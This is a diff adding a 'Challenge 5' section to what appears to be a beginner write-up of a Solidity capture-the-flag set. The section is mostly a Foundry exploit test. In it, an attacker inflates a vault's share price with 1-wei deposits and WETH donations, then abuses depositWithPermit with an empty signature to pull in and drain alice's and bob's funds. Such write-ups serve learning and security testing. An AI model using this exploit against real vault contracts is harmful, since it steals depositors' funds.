@@ -304,3 +304,62 @@ function testWhitehatRescue() public {
 ## Result
 ![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/fc9f8338-963c-42ac-8c11-c7956be0dd83)
 
+
+# Challenge 5
+
+```solidity
+
+    function testExploit() public {
+        vm.startPrank(attacker);
+        uint attackerBalance=10 ether;
+        weth.deposit{value:10 ether}();
+        uint alice_balance=500 ether;
+        for (uint i = 0; alice_balance>0; i++) {
+        console.log("\n iteration number ",i,"\n");
+        weth.approve(address(vault),1 wei);
+        vault.deposit(1 wei, attacker);
+        weth.transfer(address(vault) , attackerBalance-1 );    
+        console.log("vault:attacker:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
+        uint alice_deposit_amount=alice_balance>=attackerBalance - 1 ? attackerBalance - 1 : alice_balance;
+        vault.depositWithPermit(alice,alice_deposit_amount ,block.timestamp+10000,1,"","");
+        console.log("vault:alice:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());        
+        console.log("vault State after bob's deposit : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
+        vault.redeem(1, attacker, attacker);
+        console.log("vault:attacker:Redeem:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
+        alice_balance=weth.balanceOf(alice);        
+        attackerBalance=weth.balanceOf(attacker);
+        console.log("\nbalance of attacker",attackerBalance/10**18," ETH \n");
+    
+        }
+        uint bob_balance=500 ether;
+
+        for (uint i = 0; bob_balance>0; i++) {
+        console.log("\n iteration number ",i,"\n");
+        weth.approve(address(vault),1 wei);
+        vault.deposit(1 wei, attacker);
+        weth.transfer(address(vault) , attackerBalance-1 );    
+        console.log("vault:attacker:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
+        uint bob_deposit_amount=bob_balance>=attackerBalance - 1 ? attackerBalance - 1 : bob_balance;
+        vault.depositWithPermit(bob,bob_deposit_amount ,block.timestamp+10000,1,"","");
+        console.log("vault:bob:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());        
+        console.log("vault State after bob's deposit : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
+        vault.redeem(1, attacker, attacker);
+        console.log("vault:attacker:Redeem:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
+        bob_balance=weth.balanceOf(bob);        
+        attackerBalance=weth.balanceOf(attacker);
+        console.log("\nbalance of attacker",attackerBalance/10**18," ETH \n");
+    
+        }
+
+        // assertGt(
+        //     weth.balanceOf(address(attacker)),
+        //     1000 ether,
+        //     "Attacker should have more than 1000 ether"
+        // );
+
+    }
+
+
+```
+## Result
+![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/8d7929d1-0e6e-4583-9118-79eb17aad651)
